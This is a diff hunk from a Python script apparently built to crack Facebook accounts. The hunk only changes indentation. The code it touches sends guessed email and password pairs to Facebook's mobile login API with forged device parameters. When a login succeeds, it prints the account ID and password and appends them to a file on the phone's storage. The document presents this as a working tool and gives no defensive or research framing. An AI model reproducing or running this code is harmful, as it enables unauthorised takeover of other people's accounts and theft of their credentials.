@@ -425,25 +425,25 @@ class crack_main():
                         data = {'adid':adid,'format':'json','device_id':device_id,'email':ids,'password':pas,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','meta_inf_fbmeta':'','currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate',}
                         po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
                                 #print(po,hdata)ata)
-                                try:
-                                        roid = str(po['uid'])
-                                except:
-                                        roid = iid
-                                if 'session_key' in po:
-                                        print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
-                                        open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
-                                        ok.append(iid)
-                                        break
-                                elif 'Please Confirm Email' in po:
-                                        print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
-                                        open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
-                                        ok.append(iid)
-                                        break
-                                else:
-                                        continue
-                        loop+=1
-                except Exception as e:
-                        pass
+                        try:
+                                roid = str(po['uid'])
+                        except:
+                                roid = iid
+                        if 'session_key' in po:
+                                print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
+                                open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
+                                ok.append(iid)
+                                break
+                        elif 'Please Confirm Email' in po:
+                                print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
+                                open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
+                                ok.append(iid)
+                                break
+                        else:
+                                continue
+                loop+=1
+        except Exception as e:
+                pass
                         #print(e)
 
         def pasw(self):
